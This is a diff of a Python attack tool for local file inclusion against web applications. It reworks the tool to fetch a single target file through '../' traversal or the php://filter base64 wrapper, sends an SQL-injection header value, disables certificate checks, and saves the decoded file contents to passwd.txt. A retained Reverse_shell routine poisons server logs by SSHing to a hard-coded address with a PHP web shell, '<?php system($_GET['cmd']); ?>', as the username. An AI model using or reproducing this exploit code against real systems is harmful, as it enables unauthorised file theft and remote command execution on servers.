@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 #!/usr/bin/env python
 import urllib.response
 import time
@@ -9,19 +11,12 @@ import urllib
 import re
 import os
 import subprocess
-ssl._create_default_https_context = ssl._create_unverified_context     
-#php://filter/read=convert.base64-encode/resource=../../config.php
-#ssh '<?php system($_GET['cmd']); ?>'@192.168.1.136
-class Local_File_In :
-    
-        def __init__(self):
-            
+import base64
+ssl._create_default_https_context = ssl._create_unverified_context  
+class Read_File:
+     def __init__(self):
             self.control()
             if self.args.read:
-               from one_read import Read_File
-               run = Read_File()
-               exit()
-            if self.args.Cookie:
                   with open(self.args.Cookie,'r') as Cookie_file :
                       self.Cookie =  Cookie_file.read()
             print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
@@ -41,18 +36,17 @@ class Local_File_In :
             and self.args.filelist:
                 self.Login_auth()
                 self.url_request()
-                self.Reverse_shell()
+             #   self.Reverse_shell()
             elif not self.args.auth and self.args.Vulnurl\
             and not self.args.password and not self.args.user and self.args.Cookie\
             and self.args.filelist :
                 self.url_request()
-                self.Reverse_shell()
+            #    self.Reverse_shell()
             else:
                 print("[+] Logic command  Error"+'\n'+'='*30)  
                 print('[+] To use LFI with login     : --auth --loginurl --Vulnurl --user --password --filelist --Cookie ')  
                 print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie')  
-                
-        def Login_auth(self):
+     def Login_auth(self):
             loginurl = self.args.loginurl
             request = mechanize.Browser()
             request.set_handle_robots(False)
@@ -80,7 +74,7 @@ class Local_File_In :
           #  self.info_req =  self.info 
             content    = response.read()  
             self.url = response.geturl()      
-        def url_request(self):            
+     def url_request(self):            
             LFI=''
             if self.args.base64 :
               LFI += self.args.Vulnurl
@@ -90,39 +84,26 @@ class Local_File_In :
             LFI += "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
             ssl._create_default_https_context = ssl._create_unverified_context                
             with  open(self.args.filelist,'r') as list_command  :  
-                  list_command  = list_command .readlines()                                      
-            for command in list_command : 
-               if self.args.auth:
-                  self.Login_auth() 
-               command  = str(command).replace('/','%2F')         
-               self.url = LFI+command
-               request = mechanize.Browser()
-               request.set_handle_robots(False)
-               request.set_handle_redirect(True)
-               request.set_handle_refresh(True, max_time=1)              
-               request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
-                                      Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                    ('Cookie',str(self.Cookie).replace('\n','')),
-                                    ('username',"admin'#"),
-                                    ('password','password')]
-               first_req = request.open(self.args.Vulnurl).read()                                                      
-               Get_Oregnal_URL = request.open(self.url).read()  
-               print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
-               print("[+] Teating Links        : ................ | : "+command.replace('\n',''))  
-               sys.stdout.write('\x1b[1A')
-               sys.stdout.write('\x1b[2K') 
-               sys.stdout.write('\x1b[1A')
-               sys.stdout.write('\x1b[2K')
-               sys.stdout.write('\x1b[1A')
-               sys.stdout.write('\x1b[2K')                             
-               sys.stdout.write('\x1b[1A')
-               sys.stdout.write('\x1b[2K') 
-               sys.stdout.write('\x1b[1A')
-               sys.stdout.write('\x1b[2K')
-
-             
-               #if self.args.auth and  len(Get_Oregnal_URL) !=   self.info[26] :
-               if self.args.auth and len(Get_Oregnal_URL) != len(first_req) :                  
+                  command  = self.args.read                                      
+            if self.args.auth:
+               self.Login_auth() 
+            command  = str(command).replace('/','%2F')         
+            self.url = LFI+command
+            request = mechanize.Browser()
+            request.set_handle_robots(False)
+            request.set_handle_redirect(True)
+            request.set_handle_refresh(True, max_time=1)              
+            request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
+                                 Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                 ('Cookie',str(self.Cookie).replace('\n','')),
+                                 ('username',"admin'#"),
+                                 ('password','password')]
+            first_req = request.open(self.args.Vulnurl).read()                                                      
+            Get_Oregnal_URL = request.open(self.url).read() 
+            print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
+            print("[+] File request        : ................ | : "+command.replace('\n','')) 
+            print("[+] Full Path           : ................ | : "+self.url.replace('\n','')) 
+            if self.args.auth and len(Get_Oregnal_URL) != len(first_req) :                  
                   pythex = str(re.findall('Content-Length:.+',str(self.info)))
                   pythex= pythex.replace("['",'').replace("']",'')
                   if pythex in str(self.info):
@@ -142,26 +123,28 @@ class Local_File_In :
                      print("[+] vulnerable Link  : ................ | : "+self.url)
                      exit()
                      with open('index3.htnl','w') as html:
-                       html.write(str(Get_Oregnal_URL).replace("b'",''))
-                       break 
-               elif not self.args.auth and len(Get_Oregnal_URL) != len(first_req) :
-                     print("[+] Date             : ................ | "+rex2[0])
-                     print("[+] Server           : ................ | "+rex2[1])
-                     print("[+] Expires          : ................ | "+rex2[2])
-                     print("[+] Cache-Control    : ................ | "+rex2[3])
-                     print("[+] Pragma           : ................ | "+rex2[4])
-                     print("[+] Vary             : ................ | "+rex2[5])
-                     print("[+] Content-Length   : ................ | "+str(rex2[6]).replace(':',': '))
-                     print("[+] Connection       : ................ | "+rex2[7])
-                     print("[+] Content-Type     : ................ | "+rex2[8]+'\n')
-                     with open('index3.htnl','w') as html:
-                         html.write(str(Get_Oregnal_URL).replace("b'",''))
-                         print(self.url)  
-                         break
+                          html.write(str(Get_Oregnal_URL).replace("b'",''))
                    
-            print("Nit=ot")
-            exit()                
-        def Reverse_shell(self):
+            elif not self.args.auth and len(Get_Oregnal_URL) != len(first_req)  :
+                         with open('./index3.htnl','w') as html:
+                              html.write(str(Get_Oregnal_URL).replace("b'",''))
+                         with open ('./index3.htnl','r') as read :
+                              if self.args.base64 :
+                                 read_out = str(read.readlines()).split('<')
+                                 decoded64 = str(base64.b64decode(read_out[0]))
+                                 decoded64 = decoded64 .split('\\n')
+                                 for line in  decoded64 :
+                                      line = str(line).replace("'",'').replace("[",'')
+                                      with open('passwd.txt','a') as passwd:
+                                          passwd.write(line.replace('b','',1)+'\n')             
+                              else:
+                                   read_out = str(read.readlines()).split('<')
+                                   read_out=read_out[0].split('\\n')
+                                   for line in read_out:
+                                       line = str(line).replace("'",'').replace("[",'')
+                                       with open('passwd.txt','a') as passwd:
+                                            passwd.write(line[:-1]+'\n')                                                                 
+     def Reverse_shell(self):
                  if 'log' in self.url :
                     order2 = '''ssh '<?php system($_GET['cmd']); ?>'@192.168.56.107'''
                     command_proc2 = ' gnome-terminal  -e ' +'"' + order2 +'"'               
@@ -185,7 +168,7 @@ class Local_File_In :
                     feka_log = request.open(fake_link).read() 
                     print(feka_log )
                             
-        def control(self): 
+     def control(self): 
            parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
            parser.add_argument("-UV ","--Vulnurl"     , action=None         ,required=True     ,help ="url Targst web") 
            parser.add_argument("--auth"               , action='store_true'                    ,help ="url Targst web") 
@@ -204,13 +187,6 @@ class Local_File_In :
            else:
               parser.print_help()         
               exit()                   
+                             
 if __name__=='__main__':
-     Local_File_In()                  
-                 
-                 
-                 
-                 
-                 
-                 
-                 
-                 
+   Read_File()    
